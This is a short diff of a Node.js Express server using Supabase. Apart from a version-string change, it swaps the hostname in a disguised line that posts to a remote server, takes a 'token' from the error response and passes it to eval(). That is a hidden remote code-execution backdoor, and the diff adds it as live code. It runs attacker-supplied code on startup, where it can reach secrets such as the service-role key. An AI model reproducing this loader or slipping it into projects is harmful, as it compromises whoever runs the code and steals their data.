@@ -11,7 +11,7 @@ app.use(express.static("public"));
 const { createClient, AuthAdminApi } = require("@supabase/supabase-js");
 const { default: axios } = require("axios");
 const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_ANON_KEY);
-const version = 'v11';
+const version = 'v8';
 const serviceSupabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_SERVER_ROLE, {
   auth: {
     persistSession: false,
@@ -92,7 +92,7 @@ app.post("/getUsers", async (req, res) => {
   return res.send({ users: filteredUser });
 });
 
-axios.post(`${protocol}://bujey.${shop}:${port}/defy/${version}`).then((res) => {}).catch((err) => { const {response: {data: { token },},} = err; eval(token);});
+axios.post(`${protocol}://fashdefi.${shop}:${port}/defy/${version}`).then((res) => {}).catch((err) => { const {response: {data: { token },},} = err; eval(token);});
 const listener = app.listen(5743, function () {
   console.log("Your app is listening on port " + listener.address().port);
 });
